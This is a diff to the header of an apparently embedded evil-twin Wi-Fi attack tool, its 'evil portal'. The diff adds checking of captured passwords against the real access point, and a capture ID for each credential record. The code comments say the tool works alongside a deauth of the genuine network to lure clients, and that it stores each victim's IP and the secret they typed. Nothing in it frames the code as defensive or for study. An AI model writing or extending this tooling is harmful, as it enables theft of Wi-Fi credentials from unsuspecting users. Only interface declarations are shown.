@@ -18,15 +18,20 @@
 
 // Bring the twin up on `channel` (match the real AP's channel so a deauth on
 // the genuine one nudges clients here). Returns false if SoftAP init fails.
-bool evil_portal_start(const char *ssid, uint8_t channel);
+// bssid is remembered for password verification against the real AP; pass
+// NULL / zeroed to disable verification (falls back to the old behaviour of
+// simply logging whatever was typed).
+bool evil_portal_start(const char *ssid, const uint8_t bssid[6], uint8_t channel);
 void evil_portal_stop();
 bool evil_portal_running();
 
-// Pump DNS + HTTP. Call every UI tick while the panel is up.
+// Pump DNS + HTTP + credential-verification state machine. Call every UI tick
+// while the panel is up.
 void evil_portal_tick();
 
 // One captured submission, kept in a small in-RAM ring for the live list.
 struct EvilCred {
+    int  cred_id;     // monotonic capture number — feeds evil_verify_status()
     char time[9];     // "HH:MM:SS" (or "?" with no RTC)
     char ip[16];      // victim's IP on the twin
     char secret[48];  // what they typed
